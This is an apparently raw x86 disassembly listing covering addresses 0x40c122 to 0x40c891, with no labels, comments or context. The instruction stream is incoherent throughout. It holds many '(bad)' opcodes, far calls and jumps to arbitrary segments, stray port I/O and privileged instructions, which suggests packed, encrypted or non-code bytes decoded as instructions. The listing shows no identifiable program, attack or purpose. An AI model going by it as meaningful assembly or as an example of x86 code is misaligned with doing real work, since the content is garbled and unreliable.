  40c122:	adc    DWORD PTR [eax+0x74bfb3ba],0x36d1b149
  40c12c:	ds nop
  40c12e:	sbb    bh,BYTE PTR [ebx]
  40c130:	mov    esi,0xcb908ffa
  40c135:	mov    dl,0x3
  40c137:	pop    esi
  40c138:	xor    edx,DWORD PTR [edx]
  40c13a:	(bad)  
  40c13c:	inc    eax
  40c13d:	daa    
  40c13e:	out    0x9a,eax
  40c140:	int3   
  40c141:	(bad)  
  40c142:	lock cmp ch,dh
  40c145:	sar    DWORD PTR ss:[edi-0x1a92eed8],cl
  40c14c:	add    al,BYTE PTR [ebp+0x71619633]
  40c152:	xchg   edx,eax
  40c153:	daa    
  40c154:	adc    eax,0xc6d1142b
  40c159:	cdq    
  40c15a:	mov    cl,0x52
  40c15c:	sahf   
  40c15d:	mov    esp,0x7c26b14f
  40c162:	call   0x943a:0x284ff78e
  40c169:	loop   0x40c1cc
  40c16b:	mov    ds:0xa9ed5386,eax
  40c170:	xchg   DWORD PTR [ecx-0x70ed6a7b],esp
  40c176:	push   esi
  40c177:	hlt    
  40c178:	pop    ds
  40c179:	sub    eax,0x5057b74d
  40c17e:	sahf   
  40c17f:	xlat   BYTE PTR ds:[ebx]
  40c180:	push   edi
  40c181:	mov    ebx,0xad3c6546
  40c186:	add    ecx,DWORD PTR [edx]
  40c188:	pop    ds
  40c189:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c18a:	mov    ecx,0x3eec1b5
  40c18f:	mov    esi,DWORD PTR [esi-0x7286bf97]
  40c195:	push   ss
  40c196:	sahf   
  40c197:	xchg   DWORD PTR [esi+edx*8-0x4b984989],edx
  40c19e:	cwde   
  40c19f:	test   BYTE PTR [eax-0x1ef6ec63],al
  40c1a5:	pop    DWORD PTR [esi]
  40c1a7:	cli    
  40c1a8:	cwde   
  40c1a9:	ins    BYTE PTR es:[edi],dx
  40c1aa:	jmp    0xb7d4fef4
  40c1af:	imul   edi,DWORD PTR ds:0xb48708cc,0x4c8b5d9e
  40c1b9:	mov    al,ds:0x657ab42
  40c1be:	lods   al,BYTE PTR ds:[esi]
  40c1bf:	stos   BYTE PTR es:[edi],al
  40c1c0:	daa    
  40c1c1:	push   es
  40c1c2:	(bad)  
  40c1c3:	and    cl,BYTE PTR [esi+0x698c8e86]
  40c1c9:	push   ss
  40c1ca:	fidivr DWORD PTR [esi+0x7e740f5d]
  40c1d0:	(bad)  
  40c1d1:	call   0x735fdadb
  40c1d6:	mov    ds:0x2751f6a8,al
  40c1db:	cmp    eax,0xfe18174f
  40c1e0:	dec    ecx
  40c1e1:	dec    ebx
  40c1e2:	xchg   BYTE PTR [edx],ah
  40c1e4:	jl     0x40c18d
  40c1e6:	sub    eax,0x704df3fa
  40c1eb:	mov    ah,0xe1
  40c1ed:	ins    BYTE PTR es:[edi],dx
  40c1ee:	scas   al,BYTE PTR es:[edi]
  40c1ef:	repz jle 0x40c177
  40c1f2:	rol    DWORD PTR [esi-0x58c38e8],1
  40c1f8:	inc    eax
  40c1f9:	cmp    ah,BYTE PTR [esi+ecx*2]
  40c1fc:	mov    BYTE PTR [ebx-0x64],0x76
  40c200:	mov    ebp,0x2ae1e500
  40c205:	adc    al,0x34
  40c207:	pop    ebp
  40c208:	aam    0x3a
  40c20a:	dec    ecx
  40c20b:	jmp    0x642e:0x539584a6
  40c212:	retf   0x7b9c
  40c215:	and    DWORD PTR [esi],edx
  40c217:	mov    bh,0x6
  40c219:	push   ebx
  40c21a:	push   ecx
  40c21b:	dec    esi
  40c21c:	ins    BYTE PTR es:[edi],dx
  40c21d:	scas   eax,DWORD PTR es:[edi]
  40c21e:	rol    BYTE PTR ds:0xea52c4de,cl
  40c224:	jp     0x40c264
  40c226:	in     eax,0x29
  40c228:	ficom  DWORD PTR [esi+esi*8]
  40c22b:	mov    dl,0x5a
  40c22d:	dec    eax
  40c22e:	mov    ss,esp
  40c230:	adc    edi,DWORD PTR [ebx-0x327f2392]
  40c236:	mov    eax,DWORD PTR [edx-0x28486de6]
  40c23c:	jno    0x40c271
  40c23e:	jbe    0x40c251
  40c240:	daa    
  40c241:	push   es
  40c242:	sbb    eax,DWORD PTR [esi-0x67a0690b]
  40c248:	xlat   BYTE PTR ds:[ebx]
  40c24a:	sbb    dl,BYTE PTR [ebx+ebx*8-0x80]
  40c24e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c24f:	push   ebx
  40c250:	ret    0xd959
  40c253:	stos   BYTE PTR es:[edi],al
  40c254:	and    dl,dl
  40c256:	test   cl,0xe5
  40c259:	ret    
  40c25a:	adc    esp,DWORD PTR [ebp-0xcb9eb85]
  40c260:	dec    edi
  40c261:	aad    0x14
  40c263:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c264:	jmp    0x77bc5d70
  40c269:	jb     0x40c243
  40c26b:	test   al,0x20
  40c26d:	pushf  
  40c26e:	(bad)  
  40c26f:	mov    edi,DWORD PTR ds:0x13d00aa0
  40c275:	or     ch,BYTE PTR [eax]
  40c277:	ror    DWORD PTR [ebx+ecx*2+0x70],0x64
  40c27c:	(bad)  
  40c27d:	icebp  
  40c27e:	outs   dx,DWORD PTR ds:[esi]
  40c27f:	and    DWORD PTR [ecx],0xf21ac5bb
  40c285:	dec    ebp
  40c286:	jmp    0xe4e1c1b8
  40c28b:	xor    eax,0xe89b6af1
  40c290:	int3   
  40c291:	xchg   ebx,eax
  40c292:	sub    bh,BYTE PTR [edx]
  40c294:	dec    edx
  40c295:	das    
  40c296:	or     edx,DWORD PTR [esi+0x46649cc5]
  40c29c:	push   edi
  40c29d:	add    al,0x50
  40c29f:	xchg   esi,eax
  40c2a0:	mov    ds:0xf85a5f2f,al
  40c2a5:	div    BYTE PTR [esi]
  40c2a7:	xchg   ebx,eax
  40c2a8:	pop    edx
  40c2a9:	jmp    0x8181:0xb64b8251
  40c2b0:	jne    0x40c269
  40c2b2:	lds    edx,FWORD PTR [esi-0x4d]
  40c2b5:	sbb    BYTE PTR [eax],dl
  40c2b7:	inc    ebp
  40c2b8:	shl    ah,cl
  40c2ba:	inc    esp
  40c2bb:	and    BYTE PTR [esi+eiz*1],0xee
  40c2bf:	aad    0x22
  40c2c1:	pop    esp
  40c2c2:	lock cmp DWORD PTR [edi-0x5c2b362c],ebp
  40c2c9:	pop    ebx
  40c2ca:	dec    esi
  40c2cb:	pop    DWORD PTR [edx-0x6d95edb5]
  40c2d1:	dec    edx
  40c2d2:	je     0x40c334
  40c2d4:	add    DWORD PTR [ebp+0xb],ecx
  40c2d7:	sub    al,0xc7
  40c2d9:	add    al,0xf2
  40c2db:	inc    esp
  40c2dc:	dec    ebp
  40c2dd:	sbb    DWORD PTR [edx+0x52319e86],ebx
  40c2e3:	add    al,BYTE PTR [esi+eiz*2-0x364636bb]
  40c2ea:	ficom  DWORD PTR [eax-0x5bd8fcf3]
  40c2f0:	arpl   WORD PTR [ebx-0x6f],bx
  40c2f3:	imul   esi,DWORD PTR [edx+0x1bda5ccd],0x59
  40c2fa:	adc    dh,BYTE PTR [edx+0x611b7973]
  40c300:	shr    BYTE PTR [eax+eax*8],0xc9
  40c304:	add    DWORD PTR [esi-0x45],edx
  40c307:	inc    esi
  40c308:	pop    ecx
  40c309:	in     al,dx
  40c30a:	xchg   BYTE PTR [edi+0xb7e6d3f],dh
  40c310:	xor    eax,0xf242078a
  40c315:	pushf  
  40c316:	add    bh,BYTE PTR [ecx]
  40c318:	scas   al,BYTE PTR es:[edi]
  40c319:	mov    ecx,0x79d4483d
  40c31e:	xchg   bl,bl
  40c320:	mov    ds:0x16ccf76f,eax
  40c325:	mov    al,0x20
  40c327:	xor    dl,BYTE PTR [esi+0xa]
  40c32a:	add    eax,DWORD PTR [ebx]
  40c32c:	cli    
  40c32d:	pop    es
  40c32e:	inc    esp
  40c32f:	jo     0x40c327
  40c331:	call   0x5c4:0x77c0d7f
  40c338:	sub    DWORD PTR [edx+0x24a36878],ebp
  40c33e:	and    eax,0x27893ed3
  40c343:	mov    al,0x1a
  40c345:	add    ebx,ebx
  40c347:	xor    DWORD PTR [ecx-0x47894482],esi
  40c34d:	dec    esi
  40c34e:	call   0x2e40fcb9
  40c353:	(bad)  
  40c354:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c355:	aaa    
  40c356:	jl     0x40c3bc
  40c358:	or     DWORD PTR [edi+0x1c],edi
  40c35b:	mov    cl,0xae
  40c35d:	push   edi
  40c35e:	ja     0x40c3df
  40c360:	push   edi
  40c361:	in     al,dx
  40c362:	sti    
  40c363:	xor    DWORD PTR [edi],edx
  40c365:	add    eax,ebp
  40c367:	arpl   WORD PTR [eax-0x1304e3c9],ax
  40c36d:	dec    ebx
  40c36e:	or     cl,BYTE PTR ds:0x75155b5b
  40c374:	inc    edi
  40c375:	and    DWORD PTR [ebx-0x3832d0a5],0xffffffad
  40c37c:	(bad)  
  40c37d:	out    0xc2,eax
  40c37f:	repnz shl BYTE PTR [esi-0x4a47c67f],cl
  40c386:	sbb    BYTE PTR [ecx-0x1a],0x48
  40c38a:	rol    DWORD PTR [esi],0x84
  40c38d:	add    al,cl
  40c38f:	mov    WORD PTR [ebp+0x38],cs
  40c392:	in     eax,0x63
  40c394:	popf   
  40c395:	pop    ebp
  40c396:	into   
  40c397:	das    
  40c398:	out    0x51,eax
  40c39a:	cwde   
  40c39b:	call   0xaafe2c91
  40c3a0:	ss shl edx,cl
  40c3a3:	pop    es
  40c3a4:	cld    
  40c3a5:	iret   
  40c3a6:	test   BYTE PTR [edi-0xf55c2c6],ah
  40c3ac:	jb     0x40c3a7
  40c3ae:	stos   DWORD PTR es:[edi],eax
  40c3af:	xor    DWORD PTR [edi],eax
  40c3b1:	rcr    DWORD PTR [ebp-0xd],1
  40c3b4:	adc    eax,0x7f82b363
  40c3b9:	lock xor DWORD PTR [edi],edx
  40c3bc:	mov    dl,0x9e
  40c3be:	cmp    al,0x87
  40c3c0:	add    esi,DWORD PTR es:[edi]
  40c3c3:	sti    
  40c3c4:	and    al,0xee
  40c3c6:	xor    eax,0xe423e918
  40c3cb:	xchg   ebx,eax
  40c3cc:	push   esp
  40c3cd:	adc    ecx,DWORD PTR [edi]
  40c3cf:	test   eax,0x855ee823
  40c3d4:	in     eax,0xeb
  40c3d6:	call   0x698ca556
  40c3db:	or     dl,ch
  40c3dd:	lahf   
  40c3de:	xchg   BYTE PTR [esi+0x9],ah
  40c3e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c3e2:	ins    DWORD PTR es:[edi],dx
  40c3e3:	xor    al,0x1b
  40c3e5:	add    BYTE PTR [esi],0x12
  40c3e8:	mov    ds:0x1bc0107b,eax
  40c3ed:	push   edx
  40c3ee:	add    al,0x49
  40c3f0:	adc    DWORD PTR [ebp-0x3f],ecx
  40c3f3:	(bad)  
  40c3f4:	clc    
  40c3f5:	jmp    0x40c41c
  40c3f7:	inc    ecx
  40c3f8:	test   DWORD PTR [ebx-0x18],edx
  40c3fb:	jae    0x40c43e
  40c3fd:	test   al,0x89
  40c3ff:	jge    0x40c429
  40c401:	test   BYTE PTR [ecx+0x14],cl
  40c404:	mov    ds:0x6d303cf0,al
  40c409:	sbb    DWORD PTR [edx+0x54],esi
  40c40c:	fwait
  40c40d:	mov    al,ds:0x539884c6
  40c412:	hlt    
  40c413:	xor    esi,edi
  40c415:	or     bh,BYTE PTR [ecx+0x43b5dc4d]
  40c41b:	aad    0xcf
  40c41d:	jle    0x40c40b
  40c41f:	push   es
  40c420:	adc    al,0xee
  40c422:	in     eax,0x1b
  40c424:	in     al,dx
  40c425:	mov    bh,BYTE PTR [ecx-0x5e656812]
  40c42b:	aas    
  40c42c:	cld    
  40c42d:	fnstenv [edi+edi*8+0x2a]
  40c431:	sub    BYTE PTR [edx-0x15],ah
  40c434:	fs repz int3 
  40c437:	call   0xf02f:0x8fddd195
  40c43e:	rcr    dl,0x5d
  40c441:	jmp    0x40c476
  40c443:	push   ecx
  40c444:	cmp    cl,ah
  40c446:	cmp    dh,bl
  40c448:	test   al,0xc3
  40c44a:	jmp    0x5f63e48c
  40c44f:	jmp    0x40c409
  40c451:	add    al,0xc3
  40c453:	adc    eax,esi
  40c455:	fisttp WORD PTR ds:0x891d4e8e
  40c45b:	popa   
  40c45c:	loop   0x40c448
  40c45e:	scas   eax,DWORD PTR es:[edi]
  40c45f:	sub    DWORD PTR [edi+0x2],ebp
  40c462:	cs jo  0x40c438
  40c465:	xor    DWORD PTR [ecx-0x37],edx
  40c468:	sbb    eax,0xf4a23cc1
  40c46d:	cmc    
  40c46e:	rol    BYTE PTR [eax],1
  40c470:	outs   dx,DWORD PTR ds:[esi]
  40c471:	push   0x10
  40c473:	outs   dx,BYTE PTR ds:[esi]
  40c474:	xchg   esi,eax
  40c475:	jne    0x40c428
  40c477:	je     0x40c4ba
  40c479:	out    0xbf,al
  40c47b:	jae    0x40c46f
  40c47d:	pop    esi
  40c47e:	outs   dx,DWORD PTR ds:[esi]
  40c47f:	sub    DWORD PTR [esi+0x339d5149],eax
  40c485:	jne    0x40c419
  40c487:	add    BYTE PTR [edx],bl
  40c489:	sbb    al,0x4c
  40c48b:	not    BYTE PTR [esp+esi*2-0x42]
  40c48f:	fwait
  40c490:	sti    
  40c491:	cli    
  40c492:	lods   eax,DWORD PTR ds:[esi]
  40c494:	fidiv  WORD PTR [ecx+0x7892b47f]
  40c49a:	pop    ss
  40c49b:	test   al,0x2e
  40c49d:	or     cl,bh
  40c49f:	inc    esi
  40c4a0:	aaa    
  40c4a1:	fs push ss
  40c4a3:	fcmovu st,st(3)
  40c4a5:	daa    
  40c4a6:	push   ebx
  40c4a7:	dec    esi
  40c4a8:	test   al,0xd7
  40c4aa:	jo     0x40c526
  40c4ac:	shl    BYTE PTR [ebx-0x28],1
  40c4af:	jne    0x40c457
  40c4b1:	pop    ebx
  40c4b2:	and    DWORD PTR [esi],0x7
  40c4b5:	in     eax,dx
  40c4b6:	fldenv [esp+eiz*8+0x5]
  40c4ba:	fs jbe 0x40c4d0
  40c4bd:	jp     0x40c4a1
  40c4bf:	int    0x92
  40c4c1:	ror    BYTE PTR [edi-0x3fef51fa],1
  40c4c7:	push   0xffffff8f
  40c4c9:	hlt    
  40c4ca:	xor    ecx,eax
  40c4cc:	cmp    BYTE PTR ds:[edi-0x4de45f92],ah
  40c4d3:	mov    cl,0xd3
  40c4d5:	popa   
  40c4d6:	add    BYTE PTR [ebp+0x39c1d6f8],0xb2
  40c4dd:	and    ebp,eax
  40c4df:	fwait
  40c4e0:	int    0xdb
  40c4e2:	(bad)  
  40c4e3:	xchg   ebp,eax
  40c4e4:	stos   DWORD PTR es:[edi],eax
  40c4e5:	(bad)  
  40c4e6:	jo     0x40c4e1
  40c4e8:	call   FWORD PTR [ecx-0xeb2ff2d]
  40c4ee:	sub    ecx,esi
  40c4f0:	adc    ch,BYTE PTR [ecx+0x23]
  40c4f3:	push   edx
  40c4f4:	fcomp  st(6)
  40c4f6:	sbb    ah,dh
  40c4f8:	and    DWORD PTR [edi-0x2],esi
  40c4fb:	scas   eax,DWORD PTR es:[edi]
  40c4fc:	push   ds
  40c4fd:	stc    
  40c4fe:	cwde   
  40c4ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c500:	fmulp  st(2),st
  40c502:	sub    al,0x60
  40c504:	mov    DWORD PTR [esi-0x3be6f720],0x23fda440
  40c50e:	hlt    
  40c50f:	mov    ebp,0x1ae8f95a
  40c514:	loope  0x40c4e9
  40c516:	test   al,cl
  40c518:	in     eax,0xf4
  40c51a:	xchg   esp,eax
  40c51b:	xlat   BYTE PTR ds:[ebx]
  40c51c:	mov    esi,0x60d2acda
  40c521:	or     BYTE PTR [ecx+0x6f15b502],dl
  40c527:	lods   al,BYTE PTR ds:[esi]
  40c528:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c529:	sub    al,0x80
  40c52b:	inc    esi
  40c52c:	fsub   DWORD PTR ss:[edx]
  40c52f:	ret    
  40c530:	ss test al,0xec
  40c533:	push   ebp
  40c534:	aad    0x37
  40c536:	dec    ebx
  40c537:	addr16 in eax,dx
  40c539:	loopne 0x40c50c
  40c53b:	fnop   
  40c53d:	ss push ecx
  40c53f:	fld    DWORD PTR [ebx-0x54068b5c]
  40c545:	mov    esp,0xf439411e
  40c54a:	(bad)  
  40c54b:	into   
  40c54c:	push   ecx
  40c54d:	lock stc 
  40c54f:	adc    eax,0xbc6f96c4
  40c554:	adc    al,BYTE PTR [ebx]
  40c556:	xchg   BYTE PTR [eax-0x7f],bl
  40c559:	or     al,0x7a
  40c55b:	sub    DWORD PTR [edi+0x5f],0x74
  40c55f:	pop    edx
  40c560:	(bad)  
  40c561:	mov    edi,ds
  40c563:	outs   dx,DWORD PTR ds:[esi]
  40c564:	xchg   DWORD PTR [esi+0x5dd55ff0],edx
  40c56a:	into   
  40c56b:	xchg   DWORD PTR [ebx],edx
  40c56d:	jecxz  0x40c4ef
  40c56f:	lods   al,BYTE PTR ds:[si]
  40c571:	pushf  
  40c572:	xchg   edi,eax
  40c573:	or     ch,BYTE PTR [ecx+0xb5c3484]
  40c579:	jno    0x40c58f
  40c57b:	lods   al,BYTE PTR ds:[esi]
  40c57c:	hlt    
  40c57d:	sub    DWORD PTR [ebx],esi
  40c57f:	mov    edx,0xe871735f
  40c584:	push   cs
  40c585:	data16 jns 0x40c56e
  40c588:	loop   0x40c5b7
  40c58a:	outs   dx,DWORD PTR ds:[esi]
  40c58b:	cwde   
  40c58c:	fcom   DWORD PTR [ecx-0x16]
  40c58f:	enter  0xf55,0xd6
  40c593:	jmp    0xdfd10f5d
  40c598:	dec    ebx
  40c599:	mov    ds:0x2280f388,al
  40c59e:	jecxz  0x40c5eb
  40c5a0:	inc    ecx
  40c5a1:	mov    DWORD PTR [esi],esi
  40c5a3:	ret    0x27b0
  40c5a6:	add    dh,BYTE PTR [eax]
  40c5a8:	adc    bl,BYTE PTR [ebp-0x23]
  40c5ab:	inc    ebp
  40c5ac:	aaa    
  40c5ad:	push   ds
  40c5ae:	jne    0x40c55c
  40c5b0:	add    eax,0xcb14e90b
  40c5b5:	cli    
  40c5b6:	inc    edi
  40c5b7:	leave  
  40c5b8:	xchg   DWORD PTR [ebx+0x4d934f2],ebx
  40c5be:	dec    ebp
  40c5bf:	lock add bh,BYTE PTR [ebp-0x42f5a8fe]
  40c5c6:	in     al,0x1
  40c5c8:	lods   eax,DWORD PTR ds:[esi]
  40c5c9:	aad    0xdb
  40c5cb:	jo     0x40c5c3
  40c5cd:	fneni(8087 only) 
  40c5cf:	shl    bl,1
  40c5d1:	cli    
  40c5d2:	dec    edi
  40c5d3:	cwde   
  40c5d4:	sbb    BYTE PTR [ebx-0x5e],0x22
  40c5d8:	sub    al,0x4a
  40c5da:	in     eax,dx
  40c5db:	int    0x88
  40c5dd:	sbb    dl,bh
  40c5df:	punpckhwd mm6,QWORD PTR [edi]
  40c5e2:	and    dh,bl
  40c5e4:	fiadd  DWORD PTR [ebx]
  40c5e6:	icebp  
  40c5e7:	xchg   ecx,eax
  40c5e8:	ds fdiv st(7),st
  40c5eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c5ec:	pop    ecx
  40c5ed:	call   0xdd26:0xa5229060
  40c5f4:	sub    DWORD PTR [ebp-0x66],edx
  40c5f7:	sub    ah,ah
  40c5f9:	out    0x97,eax
  40c5fb:	pop    edi
  40c5fc:	lds    ecx,FWORD PTR [esi+esi*1-0x11]
  40c600:	and    eax,esp
  40c602:	daa    
  40c603:	pop    ebx
  40c604:	and    bh,bl
  40c606:	aas    
  40c607:	cmc    
  40c608:	pop    ds
  40c609:	mov    dl,0xde
  40c60b:	pop    esi
  40c60c:	push   ds
  40c60d:	(bad)  
  40c60e:	frstor [eax+0x1cf763da]
  40c614:	jbe    0x40c608
  40c616:	idiv   BYTE PTR [ecx-0x58ea3a81]
  40c61c:	and    al,0x9e
  40c61e:	dec    ebx
  40c61f:	mov    esp,0xe420afd
  40c624:	and    eax,ebp
  40c626:	fwait
  40c627:	outs   dx,DWORD PTR ds:[esi]
  40c628:	push   ss
  40c629:	or     al,0x43
  40c62b:	mov    cs,WORD PTR [ebx]
  40c62d:	std    
  40c62e:	jmp    0x6d2975ba
  40c633:	inc    ebx
  40c634:	inc    ebx
  40c635:	pop    ds
  40c636:	jmp    0x530c6978
  40c63b:	outs   dx,DWORD PTR ds:[esi]
  40c63c:	mov    dh,0x88
  40c63e:	stos   DWORD PTR es:[edi],eax
  40c63f:	cmp    eax,0x533e16a3
  40c644:	sar    DWORD PTR [ebx+0x76],1
  40c647:	cmc    
  40c648:	icebp  
  40c649:	jne    0x40c60e
  40c64b:	aam    0x90
  40c64d:	push   0x71
  40c64f:	push   ebp
  40c650:	mov    ebx,0x68035736
  40c655:	pop    edx
  40c656:	jl     0x40c6a9
  40c658:	jmp    0x55bce44c
  40c65d:	push   cs
  40c65e:	jb     0x40c63e
  40c660:	push   ds
  40c661:	std    
  40c662:	dec    eax
  40c663:	fcomp  st(5)
  40c665:	icebp  
  40c666:	xchg   ah,ah
  40c668:	cmp    DWORD PTR [ecx],esp
  40c66a:	hlt    
  40c66b:	xor    esp,DWORD PTR [ebx]
  40c66d:	cmp    eax,0x27c9f1e2
  40c672:	cmp    ebp,eax
  40c674:	mov    ds:0x3eeeae40,eax
  40c679:	nop
  40c67a:	cli    
  40c67b:	push   esp
  40c67c:	jle    0x40c62f
  40c67e:	ja     0x40c609
  40c680:	xor    DWORD PTR [edi+0x481709cb],esp
  40c686:	pop    edi
  40c687:	xor    bl,ah
  40c689:	push   edi
  40c68a:	mov    ah,0xaa
  40c68c:	cwde   
  40c68d:	xlat   BYTE PTR ds:[ebx]
  40c68e:	pop    ds
  40c68f:	leave  
  40c690:	iret   
  40c691:	mov    edi,0xf0486757
  40c696:	hlt    
  40c697:	fdivr  DWORD PTR [ebx+0x250ef1b3]
  40c69d:	(bad)  
  40c69e:	les    esp,FWORD PTR [esi-0x5a]
  40c6a1:	jo     0x40c6e8
  40c6a3:	xchg   edi,eax
  40c6a4:	and    al,0xb5
  40c6a6:	ss repz inc eax
  40c6a9:	ss nop
  40c6ab:	adc    bl,BYTE PTR [edi]
  40c6ad:	sub    BYTE PTR [esi],0xb3
  40c6b0:	xor    DWORD PTR [esi-0x20930b7b],0x92bb6fb
  40c6ba:	nop
  40c6bb:	jge    0x40c6b3
  40c6bd:	and    al,0x8e
  40c6bf:	push   ss
  40c6c0:	and    BYTE PTR cs:[ebx+0x8],ch
  40c6c4:	add    ebx,ebp
  40c6c6:	push   ss
  40c6c7:	nop
  40c6c8:	jno    0x40c702
  40c6ca:	ss pop ss
  40c6cc:	test   al,0x45
  40c6ce:	push   eax
  40c6cf:	std    
  40c6d0:	call   0x6d86:0x7cf8dfeb
  40c6d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c6d8:	sub    ebp,esi
  40c6da:	dec    esp
  40c6db:	and    al,0x7
  40c6dd:	and    DWORD PTR [edi],edi
  40c6df:	mov    ebp,0xd302e841
  40c6e4:	fldl2t 
  40c6e6:	sahf   
  40c6e7:	retf   0x74f5
  40c6ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c6eb:	arpl   WORD PTR [ebx+0x1c],sp
  40c6ee:	sbb    al,0x8a
  40c6f0:	hlt    
  40c6f1:	test   eax,0x19796bd
  40c6f6:	fxch   st(3)
  40c6f8:	fstp   QWORD PTR fs:[edx+0x33]
  40c6fc:	lahf   
  40c6fd:	repz call 0xa75c:0x1f6d53ee
  40c705:	cmp    DWORD PTR [bx+di+0x5df6],ebp
  40c70a:	popaw  
  40c70c:	mov    edi,0x53484ec4
  40c711:	lea    edi,[edx]
  40c713:	fdiv   DWORD PTR [esi-0x5a]
  40c716:	mov    edi,0x29255e4f
  40c71b:	mov    esp,0x6aae6745
  40c720:	xchg   BYTE PTR [edx],ah
  40c722:	vcvtpd2ps xmm0,ymm2
  40c726:	xor    eax,0x6f10f8bc
  40c72b:	jne    0x40c713
  40c72d:	retf   
  40c72e:	pop    ds
  40c72f:	mov    dh,BYTE PTR [edx+0x2b]
  40c732:	sti    
  40c733:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c734:	ds aas 
  40c736:	std    
  40c737:	mov    eax,DWORD PTR [esi+eiz*1]
  40c73a:	neg    DWORD PTR [eax]
  40c73c:	sbb    DWORD PTR [edx-0x24],0x4407bd6b
  40c743:	fdivr  st,st(4)
  40c745:	pop    ss
  40c746:	and    cl,BYTE PTR [ebx+0x1535bcab]
  40c74c:	push   edx
  40c74d:	fcmovb st,st(4)
  40c74f:	dec    ebp
  40c750:	jp     0x40c711
  40c752:	aam    0x8a
  40c754:	jnp    0x40c729
  40c756:	dec    ebx
  40c757:	out    0xa7,al
  40c759:	jecxz  0x40c7da
  40c75b:	pop    ss
  40c75c:	jle    0x40c705
  40c75e:	cmp    eax,0x16d9f463
  40c763:	pushf  
  40c764:	clc    
  40c765:	mov    ss,WORD PTR [edx+0x63c49336]
  40c76b:	push   edx
  40c76c:	adc    eax,ecx
  40c76e:	add    al,BYTE PTR [ebx+0xd]
  40c771:	dec    edx
  40c772:	sub    eax,0x4f563e54
  40c777:	inc    edx
  40c778:	cld    
  40c779:	adc    DWORD PTR [ebx+0x4b],ecx
  40c77c:	(bad)  
  40c77d:	xchg   edx,eax
  40c77e:	ret    0x1d6
  40c781:	xor    eax,0x14a3390b
  40c786:	leave  
  40c787:	push   ebp
  40c788:	daa    
  40c789:	(bad)  
  40c78a:	loop   0x40c800
  40c78c:	icebp  
  40c78d:	std    
  40c78e:	pusha  
  40c78f:	mov    dl,0x23
  40c791:	(bad)  
  40c793:	jae    0x40c7ce
  40c795:	push   edi
  40c796:	dec    esp
  40c797:	xor    al,BYTE PTR [ebp+0x43]
  40c79a:	dec    esi
  40c79b:	pop    ecx
  40c79c:	in     eax,dx
  40c79d:	cmp    eax,0xef05f82b
  40c7a2:	mov    ah,BYTE PTR [ecx-0x17]
  40c7a5:	jg     0x40c72e
  40c7a7:	das    
  40c7a8:	dec    ebx
  40c7a9:	jnp    0x40c80a
  40c7ab:	cwde   
  40c7ac:	test   BYTE PTR [ebx-0x13],dh
  40c7af:	cmp    eax,0xf3a9b6d6
  40c7b4:	sbb    DWORD PTR [ebx+0x6805e05b],eax
  40c7ba:	rcr    DWORD PTR ds:0xbc55b41e,cl
  40c7c0:	dec    ebp
  40c7c1:	mov    ebp,0xa864bcf1
  40c7c6:	add    ah,dh
  40c7c8:	addr16 aam 0x99
  40c7cb:	mov    ebx,0x118d92bb
  40c7d0:	mov    al,0x2
  40c7d2:	mov    ebx,0x4579e1b0
  40c7d7:	jnp    0x40c7f4
  40c7d9:	jnp    0x40c802
  40c7db:	pop    esi
  40c7dc:	add    al,0x53
  40c7de:	es sahf 
  40c7e0:	cli    
  40c7e1:	loope  0x40c779
  40c7e3:	test   DWORD PTR [ebp-0x3af3fc00],esp
  40c7e9:	(bad)  
  40c7ea:	out    0xe6,al
  40c7ec:	mov    edi,0xcee71ce0
  40c7f1:	outs   dx,BYTE PTR ds:[esi]
  40c7f2:	rcr    BYTE PTR [edx-0x3d],1
  40c7f5:	pusha  
  40c7f6:	push   ds
  40c7f7:	icebp  
  40c7f8:	sub    BYTE PTR [edx],cl
  40c7fa:	lods   eax,DWORD PTR ds:[esi]
  40c7fb:	inc    ebx
  40c7fc:	mov    al,0xef
  40c7fe:	jns    0x40c840
  40c800:	jo     0x40c83b
  40c802:	xchg   esp,eax
  40c803:	sti    
  40c804:	call   0xafd2:0x4ccfbdf6
  40c80b:	mov    eax,ds:0x5266c85e
  40c810:	dec    esi
  40c811:	dec    esi
  40c812:	leave  
  40c813:	ret    
  40c814:	mov    eax,0x33f0e27
  40c819:	jno    0x40c846
  40c81b:	inc    esi
  40c81c:	push   0xe7d2ced8
  40c821:	cmp    al,0x66
  40c823:	je     0x40c848
  40c825:	and    al,0x6e
  40c827:	jno    0x40c81a
  40c829:	test   eax,0x245eb522
  40c82e:	jmp    0x77b5:0x21568251
  40c835:	repnz push 0xfffffffd
  40c838:	dec    ecx
  40c839:	test   DWORD PTR [esi+edx*4+0x5b],esi
  40c83d:	cmp    al,ah
  40c83f:	push   eax
  40c840:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c841:	popf   
  40c842:	repnz pop edx
  40c844:	push   ebx
  40c845:	push   ecx
  40c846:	pop    ebp
  40c847:	lds    edx,FWORD PTR [edi]
  40c849:	pop    ebp
  40c84a:	ror    BYTE PTR [ebx],cl
  40c84c:	hlt    
  40c84d:	jmp    0x2f60:0xed65f2ba
  40c854:	mov    al,0x6b
  40c856:	cmp    bl,BYTE PTR [ecx+ebp*2]
  40c859:	test   al,0x68
  40c85b:	fisubr WORD PTR [ebx+ecx*1]
  40c85e:	sub    al,0xa2
  40c860:	sbb    DWORD PTR [ecx-0x23],ecx
  40c863:	add    esp,edx
  40c865:	lds    ebp,FWORD PTR [edi-0x340642ec]
  40c86b:	cmp    eax,0xbcd9324d
  40c870:	bound  ebx,QWORD PTR [ebx+ecx*1+0x4b]
  40c874:	(bad)  [edi]
  40c876:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c877:	jb     0x40c852
  40c879:	lea    esi,[ecx+0x787a6c17]
  40c87f:	mov    dh,0x1c
  40c881:	mov    dh,0x92
  40c883:	push   ebx
  40c884:	out    dx,al
  40c885:	inc    eax
  40c887:	jge    0x490d5be
  40c88d:	pop    edi
  40c88e:	ss ins BYTE PTR es:[edi],dx
  40c890:	stos   DWORD PTR es:[edi],eax
  40c891:	inc    esi
